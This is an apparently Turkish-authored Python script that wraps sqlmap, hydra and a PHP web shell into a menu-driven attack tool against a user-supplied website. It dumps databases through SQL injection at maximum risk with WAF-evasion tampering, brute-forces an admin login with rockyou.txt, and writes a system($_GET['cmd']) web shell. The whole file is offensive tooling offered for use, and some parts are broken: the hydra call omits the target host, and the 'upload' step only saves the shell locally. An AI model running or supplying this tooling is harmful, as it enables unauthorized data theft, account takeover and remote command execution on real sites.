import subprocess


def check_sql_dialect(url):
    """
    Hedef URL'yi kullanarak SQL dilini tespit etmeye çalışır.
    Bu basit örnekte, sqlmap kullanıyoruz.
    """
    # sqlmap komutu ile veritabanı türünü tespit et
    cmd = f"sqlmap -u {url} --batch --dbms=MYSQL --level=3 --risk=3 --identify-waf --tamper=space2comment"

    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        if "MySQL" in result:
            return "MySQL"
        elif "PostgreSQL" in result:
            return "PostgreSQL"
        elif "Microsoft SQL Server" in result:
            return "MSSQL"
        elif "Oracle" in result:
            return "Oracle"
        else:
            return "Unknown"
    except subprocess.CalledProcessError as e:
        print(f"Error while detecting DBMS: {e}")
        return "Unknown"


def perform_sql_injection_attack(url, dbms_type):
    """
    Veritabanı türüne göre uygun SQL enjeksiyon saldırısını başlatır.
    """
    if dbms_type == "MySQL":
        print("MySQL SQL Injection attack detected. Attempting injection...")
        cmd = f"sqlmap -u {url} --dbms=MySQL --batch --risk=3 --level=5 --threads=10 --dump"
    elif dbms_type == "PostgreSQL":
        print("PostgreSQL SQL Injection attack detected. Attempting injection...")
        cmd = f"sqlmap -u {url} --dbms=PostgreSQL --batch --risk=3 --level=5 --threads=10 --dump"
    elif dbms_type == "MSSQL":
        print("MSSQL SQL Injection attack detected. Attempting injection...")
        cmd = f"sqlmap -u {url} --dbms=MSSQL --batch --risk=3 --level=5 --threads=10 --dump"
    elif dbms_type == "Oracle":
        print("Oracle SQL Injection attack detected. Attempting injection...")
        cmd = f"sqlmap -u {url} --dbms=Oracle --batch --risk=3 --level=5 --threads=10 --dump"
    else:
        print("Unknown DBMS. Unable to perform attack.")
        return

    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(result)
    except subprocess.CalledProcessError as e:
        print(f"Error during attack: {e}")


def create_username_file():
    usernames = [
        "admin",
        "root",
        "user1",
        "guest",
        "administrator",
        "test",
        "user123"
    ]
    with open("usernames.txt", "w") as f:
        for username in usernames:
            f.write(f"{username}\n")
    print("usernames.txt dosyası otomatik olarak oluşturuldu ve içerik eklendi.")


def run_brute_force_test(url):
    username_file = "usernames.txt"
    password_file = "/usr/share/wordlists/rockyou.txt"
    print("Brute Force testi başlatılıyor...")
    try:
        result = subprocess.run(
            f"hydra -L {username_file} -P {password_file} http-post-form \"/admin/login.php:user=^USER^&pass=^PASS^:F=incorrect\" -V",
            shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        print(output)
    except Exception as e:
        print(f"Brute Force testinde hata oluştu: {e}")


def upload_php_shell():
    shell_content = """<?php
    if(isset($_GET['cmd'])) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
    } else {
        echo "Shell çalışıyor!";
    }
    ?>"""
    filename = "shell.php"
    try:
        with open(filename, "w") as file:
            file.write(shell_content)
        print(f"PHP shell dosyası '{filename}' oluşturuldu.")
    except Exception as e:
        print(f"PHP Shell yüklemede hata oluştu: {e}")


def main():
    site = input("URL'yi girin (http:// veya https:// olmadan): ").strip()

    # SQL dilini tespit et
    dbms_type = check_sql_dialect(site)
    print(f"Detected DBMS: {dbms_type}")

    while True:
        print("\nYapmak istediğiniz işlemi seçin:")
        print("1. SQL Injection testi")
        print("2. Brute Force testi")
        print("3. PHP Shell yükleme")
        print("4. Hepsini yap")
        print("5. Çıkış")

        choice = input("Seçiminizi yapın (1/2/3/4/5): ")

        if choice == "1":
            perform_sql_injection_attack(site, dbms_type)
        elif choice == "2":
            run_brute_force_test(site)
        elif choice == "3":
            upload_php_shell()
        elif choice == "4":
            print("Tüm işlemler başlatılıyor...")
            perform_sql_injection_attack(site, dbms_type)
            run_brute_force_test(site)
            upload_php_shell()
            print("Tüm işlemler tamamlandı.")
        elif choice == "5":
            print("Çıkılıyor...")
            break
        else:
            print("Geçersiz seçim, lütfen tekrar deneyin.")


# Programı başlat
if __name__ == "__main__":
    main()
